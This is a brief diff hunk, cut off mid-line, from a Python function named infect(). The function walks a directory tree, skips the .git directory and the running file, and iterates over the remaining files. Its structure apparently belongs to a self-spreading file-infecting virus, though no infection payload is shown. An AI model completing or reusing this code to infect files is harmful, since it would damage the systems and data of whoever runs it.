@@ -10,6 +10,7 @@ def infect():
     for root, dirs, files in os.walk(current_directory):
         if '.git' in dirs:
             dirs.remove('.git')  # Exclude the .git directory
+
         for file in files:
             file_path = os.path.join(root, file)
             if file_path != running_file and not file_path.endswith('.md') and '.git' not in file_path.split(
